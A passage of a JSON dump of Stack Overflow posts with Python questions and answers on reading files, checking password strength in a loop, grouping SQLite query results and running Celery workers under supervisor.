"https://stackoverflow.com/questions/29402585/python-read-doesnt-read-csv-correctly-into-string/29402640#29402640", "title": "Python .read() doesn&#39;t read CSV correctly into string", "body": "<p>You are calling <code>feed_content.read()</code> twice. The first time, the entire content is read and the cursor now points to the end of the file. Calling <code>feed_content.read()</code> again will return an empty string, because the end of the file has already been reached.</p>\n\n<p>Please see the documentation for <a href=\"https://docs.python.org/2/tutorial/inputoutput.html#methods-of-file-objects\" rel=\"nofollow\"><code>read()</code></a> for an example of this.</p>\n\n<p>An easy fix would be to move the <code>print</code> after the assignment, to avoid attempting to call <code>read()</code> twice:</p>\n\n<pre><code>feed_content = open('/Scripts/data.txt', 'rb')\nfeed_dat = feed_content.read()\nprint feed_dat # print has been moved after the assignment\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 4740287, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yaF8P.jpg?s=128&g=1", "display_name": "cm9090", "link": "https://stackoverflow.com/users/4740287/cm9090"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 199, "favorite_count": 0, "accepted_answer_id": 29402640, "answer_count": 1, "score": 2, "last_activity_date": 1526908949, "creation_date": 1427930713, "last_edit_date": 1490376834, "question_id": 29402585, "link": "https://stackoverflow.com/questions/29402585/python-read-doesnt-read-csv-correctly-into-string", "title": "Python .read() doesn&#39;t read CSV correctly into string", "body": "<p>I am trying to push a tab delimited .txt file to Amazon using the MWS Api. The code below works:</p>\n\n<pre><code>    from boto.mws import connection\n    import time\n\n    # Amazon US MWS ID\n    MarketPlaceID = 'mpid'\n    MerchantID = 'merchantid'\n    AccessKeyID = 'akid'\n    SecretKey = 'secretkey'\n\n    conn = connection.MWSConnection(\n        aws_access_key_id=AccessKeyID,\n        aws_secret_access_key=SecretKey,\n        Merchant=MerchantID)\n\n    feed = conn.submit_feed(\n        FeedType='_POST_FLAT_FILE_PRICEANDQUANTITYONLY_UPDATE_DATA_',\n        PurgeAndReplace=False,\n        MarketplaceIdList=[MarketPlaceID],\n        content_type='text/tab-separated-values',\n        FeedContent=\"\"\"SKU  QUANTITY\nABC 123\"\"\"\n    )\n</code></pre>\n\n<p>With the method above, ABC's quantity gets set to 123. However, when I try to read the same data from a tab delimited file into feed_dat and pass feed_dat into FeedContent, I get an error stating that my headers are off.</p>\n\n<pre><code>feed_content = open('/Scripts/data.txt', 'rb')\nprint feed_content.read()\nfeed_dat = feed_content.read()\n</code></pre>\n\n<p>I have a feeling the .read() method is corrupting my tab delimited data. I can copy/paste the first couple of rows and push them through the API by wrapping the data in triple quotes, but I can't seem to read the tab file to a variable and push it that way. I have also tried encoding the file using .encode('utf-8') with no luck. Your input is appreciated!</p>\n\n<p>Thank you,</p>\n\n<p>C</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 3, "user_id": 4740345, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/935da0a4e13400c42667c378a912095c?s=128&d=identicon&r=PG&f=1", "display_name": "Jonathan Bates", "link": "https://stackoverflow.com/users/4740345/jonathan-bates"}, "reply_to_user": {"reputation": 1910, "user_id": 3749633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44ba1a2ad944c611b1a0cf236b26ba5f?s=128&d=identicon&r=PG&f=1", "display_name": "Vidhya G", "link": "https://stackoverflow.com/users/3749633/vidhya-g"}, "edited": false, "score": 0, "creation_date": 1427930983, "post_id": 29402580, "comment_id": 46980678, "body": "its an assignment for my computer science class and i have tired to make variables to print out when the user types in a password but im stuck on how to make it check for more than 8 characters and if it has a capital letter. and that is the assignment"}, {"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 0, "creation_date": 1427931480, "post_id": 29402580, "comment_id": 46980811, "body": "Edit your question to include the code you&#39;ve tried and the way in which it fails (wrong results, error message, etc.)."}, {"owner": {"reputation": 518, "user_id": 3292100, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/974f287ec5bd05e350670c5284f24371?s=128&d=identicon&r=PG", "display_name": "MrSykkox", "link": "https://stackoverflow.com/users/3292100/mrsykkox"}, "edited": false, "score": 0, "creation_date": 1427932003, "post_id": 29402580, "comment_id": 46980942, "body": "Can you read that code?? I can&#39;t, please fix it."}, {"owner": {"reputation": 12710, "user_id": 2653390, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/ArNxx.jpg?s=128&g=1", "display_name": "Shashank", "link": "https://stackoverflow.com/users/2653390/shashank"}, "edited": false, "score": 1, "creation_date": 1427933091, "post_id": 29402580, "comment_id": 46981226, "body": "Go to python.org and read the sections on control structures, assignments, and expressions. There is currently too much that&#39;s wrong with this code to give an answer that would be useful to other users. I have voted to close."}], "answers": [{"comments": [{"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 2, "creation_date": 1427932746, "post_id": 29402909, "comment_id": 46981142, "body": "Regular expressions are severe overkill for this."}, {"owner": {"reputation": 1671, "user_id": 2365792, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/M70So.jpg?s=128&g=1", "display_name": "Tim Rijavec", "link": "https://stackoverflow.com/users/2365792/tim-rijavec"}, "reply_to_user": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 0, "creation_date": 1427933329, "post_id": 29402909, "comment_id": 46981278, "body": "@TigerhawkT3 you are right about the overkill, but since we&#39;re talking about string of 8 characters it&#39;s not that severe. For instance, you could lower the string and check if the two matched (to check capital letter)."}, {"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 1, "creation_date": 1427933557, "post_id": 29402909, "comment_id": 46981344, "body": "The fact that it&#39;s for simple checks on short strings is what makes it severe overkill. Python has several basic functions and methods that would be ideal for a problem like this. I just hope this question isn&#39;t for a school assignment, because the professor will know something is up if the asker uses this code."}, {"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 0, "creation_date": 1427936080, "post_id": 29402909, "comment_id": 46981960, "body": "I see that it is indeed <a href=\"http://stackoverflow.com/questions/29402580/making-a-secure-password-program-in-python-3-4-using-while-loops/29402989#comment46980678_29402580\">for a class</a>. Oh well."}], "tags": [], "owner": {"reputation": 1671, "user_id": 2365792, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/M70So.jpg?s=128&g=1", "display_name": "Tim Rijavec", "link": "https://stackoverflow.com/users/2365792/tim-rijavec"}, "is_accepted": true, "score": -2, "last_activity_date": 1427932720, "creation_date": 1427932720, "answer_id": 29402909, "question_id": 29402580, "link": "https://stackoverflow.com/questions/29402580/making-a-secure-password-program-in-python-3-4-using-while-loops/29402909#29402909", "title": "Making a Secure Password Program in python 3.4 using while loops", "body": "<p>To check if the password string contains a number, capital letter or similar you can use regular expression, here is a nice tool to test and learn that [RegExr] (<a href=\"http://www.regexr.com/\" rel=\"nofollow\">http://www.regexr.com/</a>).</p>\n\n<p>It is a good practice to have a function that will check, validate your input if there you need to do that more than once e.q. in a while loop.</p>\n\n<pre><code>import re\n\ndef checkPassword(password):\n    \"\"\"\n    Validate the password\n    \"\"\"\n    if len(password) &lt; 8:\n        # Password to short\n        print(\"Your password must be 8 characters long.\")\n        return False\n    elif not re.findall(r'\\d+', password):\n        # Missing a number\n        print(\"You need a number in your password.\")\n        return False\n    elif not re.findall(r'[A-Z]+', password):\n        # Missing at least one capital letter\n        print(\"You need a capital letter in your password.\")\n        return False\n    else:\n        # All good\n        print(\"All good\")\n        return True\n\n# Promt user to enter valid password\npasswordValid = False\nwhile not passwordValid:\n    password = input(\"Type in your password: \")\n    passwordValid = checkPassword(password)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1671, "user_id": 2365792, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/M70So.jpg?s=128&g=1", "display_name": "Tim Rijavec", "link": "https://stackoverflow.com/users/2365792/tim-rijavec"}, "edited": false, "score": 0, "creation_date": 1427934006, "post_id": 29402989, "comment_id": 46981479, "body": "in your case any with the check isupper/islower/isdigit is slower than regex.  <code>timeit.timeit(&#39;re.findall(r&quot;[A-Z]+&quot;, &quot;asdfqweR&quot;)&#39;, setup=&quot;import re&quot;)</code> runs in 1.1296026709896978, where <code>timeit.timeit(&#39;any(i.isupper() for i in &quot;asdfqweR&quot;)&#39;)</code> runs in 1.2718868080119137"}, {"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "reply_to_user": {"reputation": 1671, "user_id": 2365792, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/M70So.jpg?s=128&g=1", "display_name": "Tim Rijavec", "link": "https://stackoverflow.com/users/2365792/tim-rijavec"}, "edited": false, "score": 0, "creation_date": 1427934556, "post_id": 29402989, "comment_id": 46981621, "body": "Are you familiar with the phrase &quot;premature optimization is the root of all evil&quot;? Besides, I tested each version with <code>perf_counter()</code> and mine takes 1-5 tenths of a millisecond while yours takes 7-8 tenths of a millisecond, for strings between a few and a few hundred characters long."}], "tags": [], "owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "is_accepted": false, "score": 0, "last_activity_date": 1427933262, "creation_date": 1427933262, "answer_id": 29402989, "question_id": 29402580, "link": "https://stackoverflow.com/questions/29402580/making-a-secure-password-program-in-python-3-4-using-while-loops/29402989#29402989", "title": "Making a Secure Password Program in python 3.4 using while loops", "body": "<p><code>len(password - 8)</code> first tries to compare <code>8</code> to the password the user entered, which won't work. You have to find the length of the password first, then compare it to <code>8</code>: <code>len(password) - 8</code>.</p>\n\n<p>Things like <code>noNum(password == False)</code> will send a boolean to the <code>noNum()</code> function I presume you have somewhere, which probably isn't what it needs. You'd probably want <code>noNum(password) == True</code> - since <code>noNum()</code> should return <code>True</code> if the passed string doesn't contain a number.</p>\n\n<p>That said, Python has string methods for determining whether a string is uppercase, lowercase, or digital (containing only digits). Use these to evaluate the given password, along with the <code>any()</code> function.</p>\n\n<pre><code>incorrectPassword= True\nwhile incorrectPassword:\n    password = input(\"type in your password: \")\n    if len(password) &lt; 8:\n        print(\"your password must be 8 characters long\")\n    elif not any(i.isdigit() for i in password):\n        print(\"you need a number in your password\")\n    elif not any(i.isupper() for i in password):\n        print(\"you need a capital letter in your password\")\n    elif not any(i.islower() for i in password):\n        print(\"you need a lowercase letter in your password\")\n    else:\n        incorrectPassword = False\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1, "user_id": 8007267, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b555b789037c84cd24a8352d67dbe41?s=128&d=identicon&r=PG&f=1", "display_name": "s.lee", "link": "https://stackoverflow.com/users/8007267/s-lee"}, "edited": false, "score": 0, "creation_date": 1505278594, "post_id": 46189048, "comment_id": 79340525, "body": "if the name contain four digits and password contain also four digits only"}, {"owner": {"reputation": 1, "user_id": 8007267, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b555b789037c84cd24a8352d67dbe41?s=128&d=identicon&r=PG&f=1", "display_name": "s.lee", "link": "https://stackoverflow.com/users/8007267/s-lee"}, "edited": false, "score": 0, "creation_date": 1505278660, "post_id": 46189048, "comment_id": 79340541, "body": "then we will execute  the programe"}], "tags": [], "owner": {"reputation": 1, "user_id": 8007267, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9b555b789037c84cd24a8352d67dbe41?s=128&d=identicon&r=PG&f=1", "display_name": "s.lee", "link": "https://stackoverflow.com/users/8007267/s-lee"}, "is_accepted": false, "score": 0, "last_activity_date": 1505279088, "last_edit_date": 1505279088, "creation_date": 1505278102, "answer_id": 46189048, "question_id": 29402580, "link": "https://stackoverflow.com/questions/29402580/making-a-secure-password-program-in-python-3-4-using-while-loops/46189048#46189048", "title": "Making a Secure Password Program in python 3.4 using while loops", "body": "<pre><code>while True :\n      name = input('Enter user name')\n      if name != 'leela':\n              continue\n      password = input('hello,leela Enter password')\n       if password='sana':\n              break\nprint('Access granted')\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 4740345, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/935da0a4e13400c42667c378a912095c?s=128&d=identicon&r=PG&f=1", "display_name": "Jonathan Bates", "link": "https://stackoverflow.com/users/4740345/jonathan-bates"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7564, "favorite_count": 0, "accepted_answer_id": 29402909, "answer_count": 3, "score": -4, "last_activity_date": 1505279088, "creation_date": 1427930701, "last_edit_date": 1427932218, "question_id": 29402580, "link": "https://stackoverflow.com/questions/29402580/making-a-secure-password-program-in-python-3-4-using-while-loops", "title": "Making a Secure Password Program in python 3.4 using while loops", "body": "<p>How do i make a python password program that asks the user to enter a password and it checks that the password is at least 8 characters, one number, one capital letter, and one lowercase letter.  If it is missing one of these, it will print out a statement telling them what they need to add to make the password secure. \nmy code so far:</p>\n\n<pre><code>incorrectPassword= True\nwhile incorrectPassword:\n    password = input(\"type in your password\")\n    if len(password &lt; 8):\n        print(\"your password must be 8 characters long\")\n    elif noNum(password == False):\n        print(\"you need a number in your password\")\n    elif noCap(password == False):\n        print(\"you need a capital letter in your password\")\n    elif NoLow(password == False):\n</code></pre>\n"}, {"tags": ["python", "sqlite"], "answers": [{"comments": [{"owner": {"reputation": 1899, "user_id": 2169327, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/66c9bad39b0964c92cc01cfdd8bb4753?s=128&d=identicon&r=PG", "display_name": "bjornasm", "link": "https://stackoverflow.com/users/2169327/bjornasm"}, "edited": false, "score": 0, "creation_date": 1427931175, "post_id": 29402653, "comment_id": 46980728, "body": "Thanks for pointing out my formatting fault. Yes I use GROUP BY and it works great, but I rather want to put the whole dataset in memory and work with it there, than querying the SQLite database that many times - but maybe just querying is the fastest way?"}], "tags": [], "owner": {"reputation": 7796, "user_id": 2334254, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-6e2XuTZAjgM/AAAAAAAAAAI/AAAAAAAAABU/JpF2-AkHsH4/photo.jpg?sz=128", "display_name": "kpie", "link": "https://stackoverflow.com/users/2334254/kpie"}, "is_accepted": false, "score": 0, "last_activity_date": 1427931330, "last_edit_date": 1427931330, "creation_date": 1427931068, "answer_id": 29402653, "question_id": 29402544, "link": "https://stackoverflow.com/questions/29402544/how-to-do-an-equivalent-of-group-by-in-python/29402653#29402653", "title": "How to do an equivalent of GROUP BY in python", "body": "<p>Have you tried 'GROUP BY' as opposed to 'group by' in your original query? </p>\n\n<p>You should be able to utilize the full breadth of sql within these wrappers.</p>\n\n<p>If you want to manipulate the data within python you need to get the data in memory in python.</p>\n"}, {"comments": [{"owner": {"reputation": 1899, "user_id": 2169327, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/66c9bad39b0964c92cc01cfdd8bb4753?s=128&d=identicon&r=PG", "display_name": "bjornasm", "link": "https://stackoverflow.com/users/2169327/bjornasm"}, "edited": false, "score": 0, "creation_date": 1427931938, "post_id": 29402752, "comment_id": 46980930, "body": "Thank you for your effort, sorry if I was unclear, but I am unsure how I would &quot;do something to each row&quot; to accomplish the same as &quot;group by&quot; and &quot;where unixtime&gt;start and unixtime&lt;end&quot;  only in python."}], "tags": [], "owner": {"reputation": 7796, "user_id": 2334254, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-6e2XuTZAjgM/AAAAAAAAAAI/AAAAAAAAABU/JpF2-AkHsH4/photo.jpg?sz=128", "display_name": "kpie", "link": "https://stackoverflow.com/users/2334254/kpie"}, "is_accepted": false, "score": 0, "last_activity_date": 1427932299, "last_edit_date": 1427932299, "creation_date": 1427931709, "answer_id": 29402752, "question_id": 29402544, "link": "https://stackoverflow.com/questions/29402544/how-to-do-an-equivalent-of-group-by-in-python/29402752#29402752", "title": "How to do an equivalent of GROUP BY in python", "body": "<pre><code>cur.execute('SELECT userid, unixtime, latitude, longitude FROM table WHERE 1=1')\nd = {}\nfor line in cur.iterdump():\n    index=(line[1]-1398942000)%3600 # line[1] might want to be line['unixtime']\n    if((index in d) == False):\n        d[index] = []\n    d[index].append(line)\n</code></pre>\n\n<p>Are you not entertained?</p>\n"}], "owner": {"reputation": 1899, "user_id": 2169327, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/66c9bad39b0964c92cc01cfdd8bb4753?s=128&d=identicon&r=PG", "display_name": "bjornasm", "link": "https://stackoverflow.com/users/2169327/bjornasm"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 134, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1427932299, "creation_date": 1427930523, "last_edit_date": 1427932024, "question_id": 29402544, "link": "https://stackoverflow.com/questions/29402544/how-to-do-an-equivalent-of-group-by-in-python", "title": "How to do an equivalent of GROUP BY in python", "body": "<p>I'm querying a SQLite database for messages inside hourly intervals, where I am interested in one entry pr userid pr hour (this is now done successfully using the GROUP BY clause). To query the database for every hourly interval takes a fairly long time, so I was thinking I would save time if I only queried the database once without any time interval, then manipulating the resulting array (chunking it up in hour sized chunks). And thus accomplishing the same as my original method. But how can I do this? </p>\n\n<pre><code>for k in range(0,3000):\n    start = 1398942000+k*60*60\n    end = 1398942000+(k+1)*60*60\n    cur.execute('SELECT userid, unixtime, latitude, longitude FROM table WHERE unixtime &gt; {start} AND unixtime &lt; {end} GROUP BY userid'.format(start = start, end = end))\n</code></pre>\n\n<p>This is my query as it is now. This works good, but takes a lot of time. Ideally it would look like this:</p>\n\n<pre><code>cur.execute('SELECT userid, unixtime latitude, longitude FROM message')\n</code></pre>\n\n<p>Then</p>\n\n<pre><code>* list = fetchall bla bla bla*\nfor k in range(0,137*24):\n    start = 1398942000+k*60*60\n    end = 1398942000+(k+1)*60*60\n    thisHourInterval = list[:indextoClosestUnixTimeToEnd]\n    list = list[indextoClosestUnixTimeToEnd:]\n    *Only one entry pr id in thisHourInterval*\n</code></pre>\n\n<p>Or am I wrong when I think this will be a faster solution? The amount of data is fairly large, probably >4gig.</p>\n\n<p>To be clear - I know how to get the data from the database, but I am seeking a <em>python</em> equivalent of Group BY and where unixtime> start and unixtime &lt; end</p>\n"}, {"tags": ["python", "django", "amazon-ec2", "celery"], "comments": [{"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1427951168, "post_id": 29402447, "comment_id": 46985399, "body": "put <code>celery.py</code> aside of <code>settings.py</code>.Also change, <code>app = Celery(&#39;hello_django&#39;)</code> to <code>app = Celery(&#39;tp&#39;)</code>, if your project name is <code>tp</code>."}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428035123, "post_id": 29402447, "comment_id": 47023309, "body": "I changed app = Celery(&#39;tp&#39;). What do you mean by &#39; put celery.py aside of settings.py&#39;?"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428038778, "post_id": 29402447, "comment_id": 47024098, "body": "wherever <code>settings.py</code> there should be <code>celery.py</code>.That i mean.Then what is your project name ?.I mean <code>settings.py</code> in which folder ?"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428060164, "post_id": 29402447, "comment_id": 47031848, "body": "The project name is &#39;tp&#39;"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428060760, "post_id": 29402447, "comment_id": 47032138, "body": "I&#39;ve added a screenshot of the project structure"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428061402, "post_id": 29402447, "comment_id": 47032443, "body": "<code>app = Celery(&#39;tp&#39;)</code> still not working ?"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428064472, "post_id": 29402447, "comment_id": 47034000, "body": "I just thought of something, I need to reload celery after making code changes. Can I ask you how you do this?"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428064712, "post_id": 29402447, "comment_id": 47034130, "body": "if you are running celery using <code>celery --app</code> command, quit it(Ctrl+c) and restart it."}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428064986, "post_id": 29402447, "comment_id": 47034265, "body": "This time i&#39;m not doing it that way, I&#39;m using supervisor"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428065086, "post_id": 29402447, "comment_id": 47034316, "body": "First you have to setup all this without supervisor, because otherwise to find error always look into logs."}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428067449, "post_id": 29402447, "comment_id": 47035538, "body": "if I run celery --app=tp.celery:app worker --loglevel=INFO at the command line it works (discussed above). However the rest of the celery functions don&#39;t work. I&#39;ve added more output above so you can see."}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428073156, "post_id": 29402447, "comment_id": 47038409, "body": "Dont run <code>celery woker</code> only..run like<code>celery -A tp worker -l info</code>.if it working on command line then what isrest of celery function?"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428085617, "post_id": 29402447, "comment_id": 47044160, "body": "I&#39;ve modified the question to show the output, above. by &#39;the rest of celery function&#39; do you mean tasks.py? I&#39;ve added this above"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428085955, "post_id": 29402447, "comment_id": 47044322, "body": "<code>celery --app=tp.celery:app worker --loglevel=INFO</code> is working i think, then why dont you proceed to <code>call</code> tasks ?"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428115178, "post_id": 29402447, "comment_id": 47052281, "body": "What do you mean by &#39;call tasks&#39;?"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428152499, "post_id": 29402447, "comment_id": 47060151, "body": "you have to call task in <code>tasks.py</code> na??For what purpose you using celery ?"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428154125, "post_id": 29402447, "comment_id": 47060616, "body": "Ok, I understand what you are saying. I&#39;ve added code from my view above. This does work when I run a worker from the command line but not when I try to run them as a daemon using supervisor."}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428168460, "post_id": 29402447, "comment_id": 47064789, "body": "K thats 